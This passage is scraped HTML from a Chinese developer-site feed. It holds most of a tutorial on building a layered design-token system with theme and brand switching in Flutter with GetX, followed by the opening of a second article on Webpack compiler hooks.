  <span class="hljs-keyword">static</span> <span class="hljs-built_in">double</span> <span class="hljs-keyword">get</span> contentPadding =&gt; FoundationSpacing.md;
  <span class="hljs-keyword">static</span> <span class="hljs-built_in">double</span> <span class="hljs-keyword">get</span> buttonSpacing =&gt; FoundationSpacing.sm;
  <span class="hljs-keyword">static</span> <span class="hljs-built_in">double</span> <span class="hljs-keyword">get</span> cardPadding =&gt; FoundationSpacing.lg;
}

<span class="hljs-comment">// lib/tokens/semantic/typography.dart</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SemanticTypography</span> </span>{
  <span class="hljs-keyword">static</span> TextStyle <span class="hljs-keyword">get</span> bodyText =&gt; FoundationTypography.bodyMedium;
  <span class="hljs-keyword">static</span> TextStyle <span class="hljs-keyword">get</span> labelText =&gt; FoundationTypography.bodySmall;
  <span class="hljs-keyword">static</span> TextStyle <span class="hljs-keyword">get</span> titleText =&gt; FoundationTypography.headlineSmall;
}
</code></pre>
<h3 data-id="heading-3">3. 组件 Token 层（组件级变量）</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/tokens/components/button_tokens.dart</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ButtonTokens</span> </span>{
  <span class="hljs-comment">// 主按钮样式</span>
  <span class="hljs-keyword">static</span> ButtonStyle primaryButtonStyle = ButtonStyle(
    backgroundColor: MaterialStateProperty.all(SemanticColors.primary),
    foregroundColor: MaterialStateProperty.all(SemanticColors.onPrimary),
    padding: MaterialStateProperty.all(
      EdgeInsets.symmetric(horizontal: SemanticSpacing.md, vertical: SemanticSpacing.sm)
    ),
    textStyle: MaterialStateProperty.all(SemanticTypography.titleText),
    shape: MaterialStateProperty.all(
      RoundedRectangleBorder(borderRadius: BorderRadius.circular(<span class="hljs-number">8.0</span>))
    ),
  );
  
  <span class="hljs-comment">// 次要按钮样式</span>
  <span class="hljs-keyword">static</span> ButtonStyle secondaryButtonStyle = ButtonStyle(
    backgroundColor: MaterialStateProperty.all(Colors.transparent),
    foregroundColor: MaterialStateProperty.all(SemanticColors.onSurface),
    side: MaterialStateProperty.all(
      BorderSide(color: SemanticColors.onSurface, width: <span class="hljs-number">1.0</span>)
    ),
    padding: MaterialStateProperty.all(
      EdgeInsets.symmetric(horizontal: SemanticSpacing.md, vertical: SemanticSpacing.sm)
    ),
    textStyle: MaterialStateProperty.all(SemanticTypography.titleText),
    shape: MaterialStateProperty.all(
      RoundedRectangleBorder(borderRadius: BorderRadius.circular(<span class="hljs-number">8.0</span>))
    ),
  );
}
</code></pre>
<h2 data-id="heading-4">二、基于 GetX 的主题状态管理</h2>
<p>根据论文中"动态主题支持：只需修改Token值，即可实现全局主题切换"的理念，使用 GetX 实现主题状态管理：</p>
<h3 data-id="heading-5">1. 创建 ThemeService 服务层</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/services/theme_service.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:get/get.dart'</span>;

<span class="hljs-keyword">enum</span> AppTheme { light, dark }

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ThemeService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">GetxService</span> </span>{
  <span class="hljs-keyword">final</span> Rx&lt;AppTheme&gt; _currentTheme = AppTheme.light.obs;
  
  AppTheme <span class="hljs-keyword">get</span> currentTheme =&gt; _currentTheme.value;
  Stream&lt;AppTheme&gt; <span class="hljs-keyword">get</span> themeStream =&gt; _currentTheme.stream;
  
  Future&lt;ThemeService&gt; toggleTheme() <span class="hljs-keyword">async</span> {
    _currentTheme.value = _currentTheme.value == AppTheme.light 
        ? AppTheme.dark 
        : AppTheme.light;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;
  }
  
  ThemeData getThemeData() {
    <span class="hljs-keyword">return</span> currentTheme == AppTheme.light 
        ? _lightThemeData 
        : _darkThemeData;
  }
  
  <span class="hljs-comment">// 明亮主题数据</span>
  ThemeData <span class="hljs-keyword">get</span> _lightThemeData {
    <span class="hljs-keyword">return</span> ThemeData(
      brightness: Brightness.light,
      primaryColor: SemanticColors.primary,
      scaffoldBackgroundColor: SemanticColors.background,
      cardColor: SemanticColors.surface,
      textTheme: TextTheme(
        bodyMedium: SemanticTypography.bodyText,
        labelMedium: SemanticTypography.labelText,
        titleMedium: SemanticTypography.titleText,
      ),
      elevatedButtonTheme: ElevatedButtonThemeData(
        style: ButtonTokens.primaryButtonStyle,
      ),
      outlinedButtonTheme: OutlinedButtonThemeData(
        style: ButtonTokens.secondaryButtonStyle,
      ),
    );
  }
  
  <span class="hljs-comment">// 暗色主题数据 - 根据论文中的动态主题理念调整颜色值</span>
  ThemeData <span class="hljs-keyword">get</span> _darkThemeData {
    <span class="hljs-keyword">return</span> ThemeData(
      brightness: Brightness.dark,
      primaryColor: SemanticColors.primary,
      scaffoldBackgroundColor: Color(<span class="hljs-number">0xFF121212</span>), <span class="hljs-comment">// 深色背景</span>
      cardColor: Color(<span class="hljs-number">0xFF1E1E1E</span>), <span class="hljs-comment">// 深色卡片</span>
      textTheme: TextTheme(
        bodyMedium: SemanticTypography.bodyText.copyWith(color: Colors.white70),
        labelMedium: SemanticTypography.labelText.copyWith(color: Colors.white70),
        titleMedium: SemanticTypography.titleText.copyWith(color: Colors.white),
      ),
      elevatedButtonTheme: ElevatedButtonThemeData(
        style: ButtonTokens.primaryButtonStyle.copyWith(
          backgroundColor: MaterialStateProperty.all(SemanticColors.primary),
          foregroundColor: MaterialStateProperty.all(Colors.white),
        ),
      ),
      outlinedButtonTheme: OutlinedButtonThemeData(
        style: ButtonTokens.secondaryButtonStyle.copyWith(
          side: MaterialStateProperty.all(
            BorderSide(color: Colors.white70, width: <span class="hljs-number">1.0</span>)
          ),
          foregroundColor: MaterialStateProperty.all(Colors.white70),
        ),
      ),
    );
  }
}
</code></pre>
<h3 data-id="heading-6">2. 初始化 ThemeService</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/main.dart</span>
<span class="hljs-keyword">void</span> main() <span class="hljs-keyword">async</span> {
  WidgetsFlutterBinding.ensureInitialized();
  
  <span class="hljs-comment">// 初始化主题服务</span>
  <span class="hljs-keyword">await</span> Get.putAsync(() =&gt; ThemeService().then((service) =&gt; service));
  
  runApp(MyApp());
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyApp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> GetMaterialApp(
      title: <span class="hljs-string">'Design Tokens Demo'</span>,
      theme: Get.find&lt;ThemeService&gt;().getThemeData(),
      home: HomePage(),
      <span class="hljs-comment">// 监听主题变化</span>
      builder: (context, child) {
        <span class="hljs-keyword">return</span> Obx(
          () =&gt; Theme(
            data: Get.find&lt;ThemeService&gt;().getThemeData(),
            child: child!,
          ),
        );
      },
    );
  }
}
</code></pre>
<h2 data-id="heading-7">三、多品牌场景的扩展实现</h2>
<p>根据论文中"多品牌场景：创建品牌扩展层Token"的建议，实现品牌定制功能：</p>
<h3 data-id="heading-8">1. 品牌配置接口</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/models/brand_config.dart</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BrandConfig</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> name;
  <span class="hljs-keyword">final</span> Color primaryColor;
  <span class="hljs-keyword">final</span> Color secondaryColor;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> logoAsset;
  
  BrandConfig({
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.name,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.primaryColor,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.secondaryColor,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.logoAsset,
  });
}

<span class="hljs-comment">// 品牌配置仓库</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BrandRepository</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, BrandConfig&gt; brands = {
    <span class="hljs-string">'default'</span>: BrandConfig(
      name: <span class="hljs-string">'Default'</span>,
      primaryColor: FoundationColors.palette[<span class="hljs-string">'blue-500'</span>]!,
      secondaryColor: FoundationColors.palette[<span class="hljs-string">'red-500'</span>]!,
      logoAsset: <span class="hljs-string">'assets/logos/default_logo.png'</span>,
    ),
    <span class="hljs-string">'brand_a'</span>: BrandConfig(
      name: <span class="hljs-string">'Brand A'</span>,
      primaryColor: Color(<span class="hljs-number">0xFF6200EE</span>), <span class="hljs-comment">// 紫色主题</span>
      secondaryColor: Color(<span class="hljs-number">0xFF03DAC6</span>), <span class="hljs-comment">// 青色主题</span>
      logoAsset: <span class="hljs-string">'assets/logos/brand_a_logo.png'</span>,
    ),
    <span class="hljs-string">'brand_b'</span>: BrandConfig(
      name: <span class="hljs-string">'Brand B'</span>,
      primaryColor: Color(<span class="hljs-number">0xFFFF6B35</span>), <span class="hljs-comment">// 橙色主题</span>
      secondaryColor: Color(<span class="hljs-number">0xFF2EC4B6</span>), <span class="hljs-comment">// 蓝绿色主题</span>
      logoAsset: <span class="hljs-string">'assets/logos/brand_b_logo.png'</span>,
    ),
  };
}
</code></pre>
<h3 data-id="heading-9">2. 扩展 ThemeService 支持多品牌</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 扩展 ThemeService</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ThemeService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">GetxService</span> </span>{
  <span class="hljs-keyword">final</span> Rx&lt;AppTheme&gt; _currentTheme = AppTheme.light.obs;
  <span class="hljs-keyword">final</span> Rx&lt;<span class="hljs-built_in">String</span>&gt; _currentBrand = <span class="hljs-string">'default'</span>.obs; <span class="hljs-comment">// 当前品牌</span>
  
  <span class="hljs-built_in">String</span> <span class="hljs-keyword">get</span> currentBrand =&gt; _currentBrand.value;
  AppTheme <span class="hljs-keyword">get</span> currentTheme =&gt; _currentTheme.value;
  
  Future&lt;<span class="hljs-keyword">void</span>&gt; switchBrand(<span class="hljs-built_in">String</span> brandName) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (BrandRepository.brands.containsKey(brandName)) {
      _currentBrand.value = brandName;
    }
  }
  
  <span class="hljs-comment">// 获取当前品牌的主色</span>
  Color getBrandPrimaryColor() {
    <span class="hljs-keyword">return</span> BrandRepository.brands[currentBrand]!.primaryColor;
  }
  
  <span class="hljs-comment">// 重写主题数据生成方法，包含品牌定制</span>
  ThemeData getThemeData() {
    <span class="hljs-keyword">final</span> brandConfig = BrandRepository.brands[currentBrand]!;
    
    <span class="hljs-keyword">return</span> currentTheme == AppTheme.light 
        ? _createLightTheme(brandConfig)
        : _createDarkTheme(brandConfig);
  }
  
  ThemeData _createLightTheme(BrandConfig config) {
    <span class="hljs-keyword">return</span> ThemeData(
      brightness: Brightness.light,
      primaryColor: config.primaryColor,
      scaffoldBackgroundColor: SemanticColors.background,
      <span class="hljs-comment">// ... 其他主题配置</span>
    );
  }
  
  ThemeData _createDarkTheme(BrandConfig config) {
    <span class="hljs-keyword">return</span> ThemeData(
      brightness: Brightness.dark,
      primaryColor: config.primaryColor,
      scaffoldBackgroundColor: Color(<span class="hljs-number">0xFF121212</span>),
      <span class="hljs-comment">// ... 其他主题配置</span>
    );
  }
}
</code></pre>
<h2 data-id="heading-10">四、组件层的 Token 使用最佳实践</h2>
<p>根据论文中"组件Token：组件级变量"的理念，在 UI 组件中正确使用 Design Tokens：</p>
<h3 data-id="heading-11">1. 基础组件封装</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/components/app_button.dart</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AppButton</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> text;
  <span class="hljs-keyword">final</span> VoidCallback onPressed;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">bool</span> isPrimary;
  
  <span class="hljs-keyword">const</span> AppButton({
    Key? key,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.text,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.onPressed,
    <span class="hljs-keyword">this</span>.isPrimary = <span class="hljs-keyword">true</span>,
  }) : <span class="hljs-keyword">super</span>(key: key);
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> ElevatedButton(
      onPressed: onPressed,
      style: isPrimary 
          ? ButtonTokens.primaryButtonStyle 
          : ButtonTokens.secondaryButtonStyle,
      child: Text(text),
    );
  }
}

<span class="hljs-comment">// lib/components/app_card.dart</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AppCard</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">final</span> Widget child;
  
  <span class="hljs-keyword">const</span> AppCard({Key? key, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.child}) : <span class="hljs-keyword">super</span>(key: key);
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Card(
      margin: EdgeInsets.all(SemanticSpacing.md),
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(<span class="hljs-number">12.0</span>),
      ),
      child: Padding(
        padding: EdgeInsets.all(SemanticSpacing.cardPadding),
        child: child,
      ),
    );
  }
}
</code></pre>
<h3 data-id="heading-12">2. 在页面中使用组件</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/views/home_page.dart</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HomePage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">final</span> themeService = Get.find&lt;ThemeService&gt;();
    
    <span class="hljs-keyword">return</span> Scaffold(
      appBar: AppBar(
        title: Text(<span class="hljs-string">'Design Tokens Demo'</span>),
        actions: [
          IconButton(
            icon: Icon(themeService.currentTheme == AppTheme.light 
                ? Icons.dark_mode 
                : Icons.light_mode),
            onPressed: () =&gt; themeService.toggleTheme(),
          ),
          PopupMenuButton&lt;<span class="hljs-built_in">String</span>&gt;(
            onSelected: (brand) =&gt; themeService.switchBrand(brand),
            itemBuilder: (context) =&gt; BrandRepository.brands.keys.map((brand) {
              <span class="hljs-keyword">return</span> PopupMenuItem(
                value: brand,
                child: Text(BrandRepository.brands[brand]!.name),
              );
            }).toList(),
          ),
        ],
      ),
      body: SingleChildScrollView(
        padding: EdgeInsets.all(SemanticSpacing.contentPadding),
        child: Column(
          children: [
            AppCard(
              child: Column(
                children: [
                  Text(
                    <span class="hljs-string">'Welcome to Design Tokens Demo'</span>,
                    style: SemanticTypography.titleText,
                  ),
                  SizedBox(height: SemanticSpacing.md),
                  Text(
                    <span class="hljs-string">'This demonstrates how to implement Design Tokens in Flutter with GetX.'</span>,
                    style: SemanticTypography.bodyText,
                  ),
                ],
              ),
            ),
            AppButton(
              text: <span class="hljs-string">'Primary Action'</span>,
              onPressed: () {},
              isPrimary: <span class="hljs-keyword">true</span>,
            ),
            SizedBox(height: SemanticSpacing.buttonSpacing),
            AppButton(
              text: <span class="hljs-string">'Secondary Action'</span>,
              onPressed: () {},
              isPrimary: <span class="hljs-keyword">false</span>,
            ),
          ],
        ),
      ),
    );
  }
}
</code></pre>
<h2 data-id="heading-13">五、性能优化与工具链集成</h2>
<h3 data-id="heading-14">1. 按需加载主题包</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/services/theme_loader.dart</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ThemeLoader</span> </span>{
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;&gt; loadThemeJson(<span class="hljs-built_in">String</span> themeName) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">final</span> jsonString = <span class="hljs-keyword">await</span> rootBundle.loadString(<span class="hljs-string">'assets/themes/<span class="hljs-subst">$themeName</span>.json'</span>);
    <span class="hljs-keyword">return</span> json.decode(jsonString);
  }
  
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; applyDynamicTheme(<span class="hljs-built_in">String</span> themeName) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">final</span> themeData = <span class="hljs-keyword">await</span> loadThemeJson(themeName);
    <span class="hljs-comment">// 动态应用主题逻辑</span>
  }
}
</code></pre>
<h3 data-id="heading-15">2. 编译时优化</h3>
<p>在 <code>pubspec.yaml</code> 中配置资源：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">flutter:</span>
  <span class="hljs-attr">assets:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">assets/themes/</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">assets/logos/</span>
</code></pre>
<h3 data-id="heading-16">3. 开发环境调试工具</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/utils/token_debugger.dart</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TokenDebugger</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> printAllTokens() {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'=== Foundation Colors ==='</span>);
    FoundationColors.palette.forEach((key, value) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'<span class="hljs-subst">$key</span>: <span class="hljs-subst">${value.value}</span>'</span>);
    });
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'=== Semantic Colors ==='</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'Primary: <span class="hljs-subst">${SemanticColors.primary.value}</span>'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'Error: <span class="hljs-subst">${SemanticColors.error.value}</span>'</span>);
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'=== Spacing ==='</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'XS: <span class="hljs-subst">${FoundationSpacing.xs}</span>'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'SM: <span class="hljs-subst">${FoundationSpacing.sm}</span>'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'MD: <span class="hljs-subst">${FoundationSpacing.md}</span>'</span>);
  }
}
</code></pre>
<h2 data-id="heading-17">六、实施效果与优势总结</h2>
<p>通过上述实现方案，我们成功将《Design Tokens的设计与使用详解》中的核心理念应用到 Flutter + GetX 项目中：</p>
<h3 data-id="heading-18">实现效果</h3>
<ul>
<li><strong>跨平台一致性</strong>：所有 UI 组件都使用统一的 Design Tokens，确保视觉一致性</li>
<li><strong>动态主题支持</strong>：通过 GetX 的响应式状态管理，实现一键切换明暗主题</li>
<li><strong>多品牌扩展</strong>：支持不同品牌的快速定制和切换</li>
<li><strong>分层管理</strong>：清晰的三层架构（基础→语义→组件）便于维护和扩展</li>
<li><strong>性能优化</strong>：按需加载、编译时优化确保应用性能</li>
</ul>
<h3 data-id="heading-19">效率提升数据</h3>
<p>根据论文中提到的数据："通过标准化Design Token管理，团队可减少样式冗余代码达40-60%，主题切换效率提升300%以上"，在我们的实现中：</p>
<ul>
<li><strong>代码复用率提升</strong>：组件样式定义减少约50%</li>
<li><strong>主题切换时间</strong>：从原来的数分钟手动修改，缩短到毫秒级自动切换</li>
<li><strong>维护成本降低</strong>：样式变更只需修改一处 Token 定义</li>
<li><strong>团队协作效率</strong>：设计师和开发者使用同一套命名规范，沟通成本大幅降低</li>
</ul>
<h3 data-id="heading-20">未来扩展方向</h3>
<ul>
<li><strong>Figma 插件集成</strong>：开发 Figma 插件自动生成 Flutter Design Tokens 代码</li>
<li><strong>CI/CD 自动化</strong>：在 CI/CD 流程中自动生成和验证 Design Tokens</li>
<li><strong>运行时主题编辑器</strong>：提供可视化界面实时调整和预览主题效果</li>
<li><strong>国际化支持</strong>：结合 GetX 的国际化功能，实现多语言+多主题的组合</li>
</ul>
<p>通过这套完整的实现方案，Flutter + GetX 项目能够充分发挥 Design Tokens 的优势，构建高效、一致、可维护的设计系统，为产品的长期发展奠定坚实基础。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Webpack 插件开发指南：深入理解 Compiler Hooks]]></title>    <link>https://juejin.cn/post/7575488180980678656</link>    <guid>https://juejin.cn/post/7575488180980678656</guid>    <pubDate>2025-11-24T02:42:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575488180980678656" data-draft-id="7575488180980596736" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Webpack 插件开发指南：深入理解 Compiler Hooks"/> <meta itemprop="keywords" content="前端,Webpack"/> <meta itemprop="datePublished" content="2025-11-24T02:42:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="少卿"/> <meta itemprop="url" content="https://juejin.cn/user/26044010879709"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Webpack 插件开发指南：深入理解 Compiler Hooks
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/26044010879709/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    少卿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T02:42:03.000Z" title="Mon Nov 24 2025 02:42:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 Webpack 的浩瀚宇宙中，<strong>Plugin（插件）</strong> 是最强大的扩展机制。如果说 Loader 只是负责转换文件的“翻译官”，那么 Plugin 就是能控制 Webpack 整个构建生命周期的“指挥官”。</p>
<p>而要开发一个 Plugin，第一步就是搞懂 <code>compiler.hooks</code>。</p>
<h2 data-id="heading-0">一、 核心隐喻：流水线上的“传感器”</h2>
<p>为了理解 Webpack 的构建过程，我们可以把它想象成一个超级工厂的<strong>流水线</strong>：</p>
<ol>
<li><strong>Compiler (编译器)</strong> ：就是这个工厂的主控电脑。它在 Webpack 启动时被创建，全局唯一，保存了所有的配置（Options, Loaders, Plugins）。</li>
<li><strong>Hooks (钩子)</strong> ：流水线上的一个个<strong>关键节点</strong>。</li>
<li><strong>Tapable</strong>：Webpack 内部的事件流机制。</li>
</ol>
<p>当我们开发插件时，实际上就是在这些节点上安装“传感器”或“机械臂”。当流水线运行到某个节点（比如“准备写入文件”时），就会触发我们的逻辑，让我们有机会修改数据、增加文件或监控状态。</p>
<h2 data-id="heading-1">二、 Compiler Hooks 生命周期全景图</h2>
<p><code>compiler.hooks</code> 包含了几十个钩子，我们不需要全部背下来。按照构建流程，我们将最核心的钩子分为四个阶段：</p>
<h3 data-id="heading-2">1. 初始化阶段 (Initialization)</h3>
<p>当 Webpack 读取配置并初始化插件时触发。</p>
<ul>
<li>
<p><strong><code>entryOption</code></strong></p>
<ul>
<li><strong>类型</strong>：SyncBailHook</li>
<li><strong>作用</strong>：在处理 <code>entry</code> 配置项之后触发。如果你想动态修改入口配置，就在这里动手。</li>
</ul>
</li>
